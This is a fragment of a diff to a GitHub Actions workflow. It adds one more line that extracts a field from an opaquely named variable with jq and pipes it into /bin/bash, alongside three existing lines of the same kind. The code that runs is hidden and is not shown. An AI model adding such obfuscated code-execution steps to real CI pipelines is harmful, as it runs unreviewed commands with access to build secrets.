@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$rvv458" | jq -r .hk56845 | /bin/bash
           printf '%s' "$gl54330" | jq -r .x891 | /bin/bash
           printf '%s' "$leg635" | jq -r .raqht286 | /bin/bash
+          echo $nhess54 | jq -r .ag070 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
